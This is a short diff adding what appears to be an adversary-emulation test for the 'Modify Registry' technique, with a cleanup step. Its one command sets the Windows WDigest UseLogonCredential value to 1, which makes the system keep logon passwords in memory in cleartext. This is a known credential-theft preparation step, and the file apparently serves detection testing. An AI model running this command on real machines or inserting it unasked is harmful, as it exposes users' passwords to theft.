@@ -1,0 +1,11 @@
+#TechniqueName: Modify Registry
+#AtomicTestName: Modify registry to store logon credentials
+#Language: cmd
+
+#commands
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+
+#cleanup_commands
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1
+
